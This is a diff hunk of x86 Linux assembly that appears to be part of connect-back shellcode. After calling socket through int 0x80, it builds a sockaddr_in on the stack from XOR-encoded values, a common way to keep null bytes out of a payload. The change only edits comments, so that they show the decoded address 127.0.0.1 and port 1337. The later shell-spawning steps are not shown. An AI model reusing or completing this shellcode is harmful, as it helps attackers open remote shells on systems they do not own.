@@ -16,10 +16,10 @@ int		0x80		; let the kernel do the stuff
 mov		edx,eax		; move socket descriptor from socket() into eax
 xor		eax,eax
 ;   sockaddr_in: in_addr
-push		0x1011116E	; push ip adr on the stack (XOR-encoded)
+push		0x1011116E	; push ip adr on the stack (XOR-encoded -> 127.0.0.1)
 xor dword	[esp],0x11111111 ; decode ip adr
 ;   sockaddr_in: tcp port
-push word	0x2814		; push tcp port (XOR-encoded)
+push word	0x2814		; push tcp port (XOR-encoded -> 1337)
 xor word	[esp],0x1111 ; decode tcp port
 ;   sockaddr_in: sa_family
 push word	0x2    ; 0x2 -> AF_INET
